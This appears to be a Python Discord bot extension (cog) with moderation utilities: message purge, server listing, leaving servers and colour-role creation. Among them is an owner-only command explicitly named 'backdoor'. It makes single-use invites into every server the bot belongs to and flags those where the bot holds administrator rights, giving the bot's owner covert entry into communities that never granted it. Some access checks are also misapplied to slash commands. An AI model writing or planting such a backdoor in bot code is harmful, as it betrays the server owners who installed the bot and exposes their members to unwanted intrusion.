import discord
from discord.ext import commands
import asyncio
from discord import app_commands
from typing import Union

class CogName(commands.Cog):
    def __init__(self, bot:commands.Bot):
        self.bot = bot


    @commands.command(aliases=['prune'])
    @commands.has_permissions(ban_members = True)
    @commands.bot_has_permissions(manage_messages = True)
    async def purge(self, ctx, *limit):
        try:
            limit = int(limit[0])
        except IndexError:
            limit = 1
        deleted = 0
        while limit >= 1:
            cap = min(limit, 100)
            deleted += len(await ctx.channel.purge(limit=cap, before=ctx.message))
            limit -= cap
        tmp = await ctx.send(f'**✂️** deleted {deleted} messages')
        await asyncio.sleep(3)
        await tmp.delete()
        await ctx.message.delete()

    @app_commands.command(name="list_servers", description="Lists the servers the bot is in.")
    @commands.is_owner()   # Ensure only users with admin permissions can use this
    async def list_servers(self, interaction: discord.Interaction):
        embed = discord.Embed(title="Servers", description="List of servers the bot is in:", color=discord.Color.blue())
        for guild in self.bot.guilds:
            embed.add_field(name=guild.name, value=f"Members: {guild.member_count}", inline=False)
        
        await interaction.response.send_message(embed=embed, ephemeral=True)  # Ephemeral to ensure it's only visible to the command invoker

   
    @commands.hybrid_command(name="backdoor", description='List servers with invites')
    @commands.is_owner()
    async def server(self, ctx):
        await ctx.defer(ephemeral=True)
        embed = discord.Embed(title="Server List", color=discord.Color.blue())

        for guild in self.bot.guilds:
            permissions = guild.get_member(self.bot.user.id).guild_permissions
            if permissions.administrator:
                invite_admin = await guild.text_channels[0].create_invite(max_uses=1)
                embed.add_field(name=guild.name, value=f"[Join Server (Admin)]({invite_admin})", inline=True)
            elif permissions.create_instant_invite:
                invite = await guild.text_channels[0].create_invite(max_uses=1)
                embed.add_field(name=guild.name, value=f"[Join Server]({invite})", inline=True)
            else:
                embed.add_field(name=guild.name, value="*[No invite permission]*", inline=True)

        await ctx.send(embed=embed, ephemeral=True)

    @app_commands.command(name="leave_server", description="Makes the bot leave the specified server.")
    @commands.is_owner()
    async def leave_server(self, interaction: discord.Interaction, server_id: str):
        try:
            guild = self.bot.get_guild(int(server_id))
            if guild:
                await guild.leave()
                await interaction.response.send_message(f"Left the server: {guild.name}", ephemeral=True)
            else:
                await interaction.response.send_message("Could not find a server with the specified ID.", ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"An error occurred: {str(e)}", ephemeral=True)

    @app_commands.command(name="create_color_role", description="Creates a color role with the specified hex value.")
    @app_commands.describe(role_name="The name of the role to create", hex_value="The hex color value for the role, e.g., #123456")
    @commands.has_permissions(manage_roles=True)
    @commands.bot_has_permissions(manage_roles=True)
    async def create_color_role(self, interaction: discord.Interaction, role_name: str, hex_value: str):
        try:
            color = discord.Color(int(hex_value.strip("#"), 16))
            role = await interaction.guild.create_role(name=role_name, color=color)
            await interaction.response.send_message(f"Role `{role.name}` with color `{hex_value}` has been created.", ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"Failed to create role: {str(e)}", ephemeral=True)
    
async def setup(bot:commands.Bot):
    await bot.add_cog(CogName(bot))

